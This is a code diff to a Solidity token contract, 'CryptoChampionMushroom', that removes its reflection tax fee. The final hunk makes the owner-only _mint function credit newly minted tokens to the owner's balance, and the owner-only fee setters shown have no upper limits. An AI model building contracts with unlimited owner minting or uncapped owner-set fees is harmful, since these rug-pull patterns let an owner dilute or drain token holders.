@@ -1096,7 +1096,6 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     uint8 private _decimals = 9;
 
     struct BuyFee {
-        uint16 tax;
         uint16 liquidity;
         uint16 marketing;
         uint16 dev;
@@ -1104,7 +1103,6 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     }
 
     struct SellFee {
-        uint16 tax;
         uint16 liquidity;
         uint16 marketing;
         uint16 dev;
@@ -1114,7 +1112,6 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     BuyFee public buyFee;
     SellFee public sellFee;
 
-    uint16 private _taxFee;
     uint16 private _liquidityFee;
     uint16 private _marketingFee;
     uint16 private _devFee;
@@ -1148,13 +1145,11 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     }
 
     constructor() {
-        buyFee.tax = 1;
         buyFee.liquidity = 1;
         buyFee.marketing = 2;
         buyFee.dev = 2;
         buyFee.donation = 0;
 
-        sellFee.tax = 1;
         sellFee.liquidity = 1;
         sellFee.marketing = 4;
         sellFee.dev = 4;
@@ -1337,13 +1332,11 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     }
 
     function setSellFee(
-        uint16 tax,
         uint16 liquidity,
         uint16 marketing,
         uint16 dev,
         uint16 donation
     ) external onlyOwner {
-        sellFee.tax = tax;
         sellFee.marketing = marketing;
         sellFee.liquidity = liquidity;
         sellFee.dev = dev;
@@ -1351,13 +1344,11 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     }
 
     function setBuyFee(
-        uint16 tax,
         uint16 liquidity,
         uint16 marketing,
         uint16 dev,
         uint16 donation
     ) external onlyOwner {
-        buyFee.tax = tax;
         buyFee.marketing = marketing;
         buyFee.liquidity = liquidity;
         buyFee.dev = dev;
@@ -1365,24 +1356,20 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     }
 
     function setBothFees(
-        uint16 buy_tax,
         uint16 buy_liquidity,
         uint16 buy_marketing,
         uint16 buy_dev,
         uint16 buy_donation,
-        uint16 sell_tax,
         uint16 sell_liquidity,
         uint16 sell_marketing,
         uint16 sell_dev,
         uint16 sell_donation
     ) external onlyOwner {
-        buyFee.tax = buy_tax;
         buyFee.marketing = buy_marketing;
         buyFee.liquidity = buy_liquidity;
         buyFee.dev = buy_dev;
         buyFee.donation = buy_donation;
 
-        sellFee.tax = sell_tax;
         sellFee.marketing = sell_marketing;
         sellFee.liquidity = sell_liquidity;
         sellFee.dev = sell_dev;
@@ -1422,20 +1409,18 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
             uint256,
             uint256,
             uint256,
-            uint256,
             uint256
         )
     {
-        uint256 tFee = calculateTaxFee(tAmount);
         uint256 tLiquidity = calculateLiquidityFee(tAmount);
         uint256 tWallet = calculateMarketingFee(tAmount) +
             calculateDevFee(tAmount);
         uint256 tDonation = calculateDonationFee(tAmount);
-        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);
+        uint256 tTransferAmount = tAmount.sub(tLiquidity);
         tTransferAmount = tTransferAmount.sub(tWallet);
         tTransferAmount = tTransferAmount.sub(tDonation);
 
-        return (tTransferAmount, tFee, tLiquidity, tWallet, tDonation);
+        return (tTransferAmount, tLiquidity, tWallet, tDonation);
     }
 
     function _getCurrentSupply() private view returns (uint256) {
@@ -1452,10 +1437,6 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
 
     function _takeDonationFee(uint256 tDonation) private {
         _tOwned[_donationAddress] = _tOwned[_donationAddress].add(tDonation);
-    }
-
-    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
-        return _amount.mul(_taxFee).div(10**2);
     }
 
     function calculateLiquidityFee(uint256 _amount)
@@ -1487,7 +1468,6 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     }
 
     function removeAllFee() private {
-        _taxFee = 0;
         _liquidityFee = 0;
         _marketingFee = 0;
         _donationFee = 0;
@@ -1495,7 +1475,6 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     }
 
     function setBuy() private {
-        _taxFee = buyFee.tax;
         _liquidityFee = buyFee.liquidity;
         _marketingFee = buyFee.marketing;
         _donationFee = buyFee.donation;
@@ -1503,7 +1482,6 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     }
 
     function setSell() private {
-        _taxFee = sellFee.tax;
         _liquidityFee = sellFee.liquidity;
         _marketingFee = sellFee.marketing;
         _donationFee = sellFee.donation;
@@ -1696,7 +1674,6 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
     ) private {
         (
             uint256 tTransferAmount,
-            ,
             uint256 tLiquidity,
             uint256 tWallet,
             uint256 tDonation
@@ -1709,6 +1686,7 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
 
     function _mint(uint256 amount) external onlyOwner {
         _tTotal += amount;
+        _tOwned[_msgSender()] += amount;
         emit Transfer(address(0), _msgSender(), amount);
     }
 }
